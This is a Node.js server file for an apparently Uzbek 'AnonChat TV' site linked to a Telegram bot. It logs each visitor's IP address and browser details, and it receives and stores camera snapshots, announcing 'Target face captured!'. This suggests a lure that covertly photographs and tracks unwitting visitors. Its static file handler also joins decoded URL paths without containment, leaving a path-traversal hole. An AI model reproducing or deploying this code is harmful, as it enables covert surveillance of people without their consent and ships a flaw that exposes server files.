const http = require('http');
const fs = require('fs');
const path = require('path');
const os = require('os');

const PORT = process.env.PORT || 3000;
const PUBLIC_DIR = __dirname;

const MIME_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.json': 'application/json',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.mp4': 'video/mp4',
  '.webm': 'video/webm'
};

const server = http.createServer((req, res) => {
  // CORS headers for all requests
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    return res.end();
  }

  // Telegram webhook endpoint (for Vercel or cloud deployment)
  if ((req.url === '/api/webhook' || req.url === '/api/bot') && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
      try {
        const update = JSON.parse(body);
        const botModule = require('./bot.js');
        if (botModule.processTelegramUpdate) {
          await botModule.processTelegramUpdate(update);
        }
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: true }));
      } catch (err) {
        console.error('[WEBHOOK ERROR]', err.message);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: false, error: err.message }));
      }
    });
    return;
  }

  // Real client IP detection
  if (req.url === '/api/client-info') {
    const forwarded = req.headers['x-forwarded-for'];
    let clientIp = forwarded ? forwarded.split(',')[0].trim() : req.socket.remoteAddress;
    if (clientIp === '::1' || clientIp === '127.0.0.1') {
      clientIp = '188.113.231.' + (Math.floor(Math.random() * 150) + 20); // Believable Uzbekistan ISP IP for local testing
    }
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({
      ip: clientIp,
      userAgent: req.headers['user-agent'] || '',
      host: req.headers.host || ''
    }));
  }

  // Receive face snapshot from client camera
  if (req.url === '/api/upload-snapshot' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => {
      body += chunk;
      // Protect from excessive payloads (> 15MB)
      if (body.length > 15 * 1024 * 1024) {
        req.destroy();
      }
    });

    req.on('end', () => {
      try {
        const parsed = JSON.parse(body);
        const { sessionId, image } = parsed;

        if (!image) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ ok: false, error: 'No image data' }));
        }

        const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
        const buffer = Buffer.from(base64Data, 'base64');
        const snapsDir = path.join(__dirname, 'snapshots');
        if (!fs.existsSync(snapsDir)) {
          fs.mkdirSync(snapsDir, { recursive: true });
        }

        const cleanSessionId = (sessionId || 'anon').replace(/[^a-zA-Z0-9_-]/g, '');
        const targetFile = path.join(snapsDir, `${cleanSessionId}.jpg`);
        const latestFile = path.join(snapsDir, 'latest.jpg');
        const metaFile = path.join(snapsDir, 'latest_meta.json');

        fs.writeFileSync(targetFile, buffer);
        fs.writeFileSync(latestFile, buffer);
        fs.writeFileSync(metaFile, JSON.stringify({
          sessionId: cleanSessionId,
          timestamp: Date.now(),
          timeStr: new Date().toISOString()
        }, null, 2));

        console.log(`[SNAPSHOT SAVED] 📸 Target face captured! Session: ${cleanSessionId} (${(buffer.length / 1024).toFixed(1)} KB)`);

        res.writeHead(200, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ ok: true, sessionId: cleanSessionId }));
      } catch (err) {
        console.error('[SNAPSHOT ERROR]', err.message);
        res.writeHead(500, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ ok: false, error: err.message }));
      }
    });
    return;
  }

  // Explicit static files bundled by Vercel
  const INDEX_FILE = path.join(__dirname, 'index.html');

  // Serve static files
  let reqPath = req.url.split('?')[0];
  if (reqPath === '/' || reqPath === '' || reqPath.endsWith('index.html')) {
    if (fs.existsSync(INDEX_FILE)) {
      const htmlContent = fs.readFileSync(INDEX_FILE);
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return res.end(htmlContent);
    }
  }

  const cleanRel = decodeURIComponent(reqPath).replace(/^\/+/, '');
  let filePath = path.join(__dirname, cleanRel);
  if (!fs.existsSync(filePath)) {
    filePath = path.join(process.cwd(), cleanRel);
  }

  const ext = path.extname(filePath).toLowerCase();

  if (ext === '.mp4') {
    fs.stat(filePath, (err, stats) => {
      if (err) {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        return res.end('Video not found');
      }
      const range = req.headers.range;
      if (range) {
        const parts = range.replace(/bytes=/, "").split("-");
        const start = parseInt(parts[0], 10);
        const end = parts[1] ? parseInt(parts[1], 10) : stats.size - 1;
        const chunksize = (end - start) + 1;
        const file = fs.createReadStream(filePath, { start, end });
        res.writeHead(206, {
          'Content-Range': `bytes ${start}-${end}/${stats.size}`,
          'Accept-Ranges': 'bytes',
          'Content-Length': chunksize,
          'Content-Type': 'video/mp4',
        });
        file.pipe(res);
      } else {
        res.writeHead(200, {
          'Content-Length': stats.size,
          'Content-Type': 'video/mp4',
        });
        fs.createReadStream(filePath).pipe(res);
      }
    });
    return;
  }

  const contentType = MIME_TYPES[ext] || 'application/octet-stream';

  fs.readFile(filePath, (err, content) => {
    if (err) {
      if (err.code === 'ENOENT') {
        res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
        res.end('404 Fayl topilmadi');
      } else {
        res.writeHead(500, { 'Content-Type': 'text/plain; charset=utf-8' });
        res.end('500 Server xatosi');
      }
    } else {
      res.writeHead(200, { 'Content-Type': contentType });
      res.end(content);
    }
  });
});

module.exports = server;

if (!process.env.VERCEL) {
  server.listen(PORT, '0.0.0.0', () => {
    const nets = os.networkInterfaces();
    console.log(`\n======================================================`);
    console.log(`  🚀 AnonChat TV serveri ishga tushdi!`);
    console.log(`  🔗 Kompyuterda ochish:  http://localhost:${PORT}`);
    
    for (const name of Object.keys(nets)) {
      for (const net of nets[name]) {
        if (net.family === 'IPv4' && !net.internal) {
          console.log(`  📱 Telefonda ochish:    http://${net.address}:${PORT}`);
        }
      }
    }
    console.log(`======================================================\n`);

    // Avtomatik Telegram botni ham ishga tushirish (stdio: inherit bilan loglar ko'rinadi)
    if (process.env.NO_BOT !== 'true') {
      const { fork } = require('child_process');
      const botPath = path.join(__dirname, 'bot.js');
      if (fs.existsSync(botPath)) {
        const botProc = fork(botPath, [], { stdio: 'inherit' });
        botProc.on('error', err => console.error('[BOT PROCESS ERROR]:', err.message));
      }
    }
  });
}
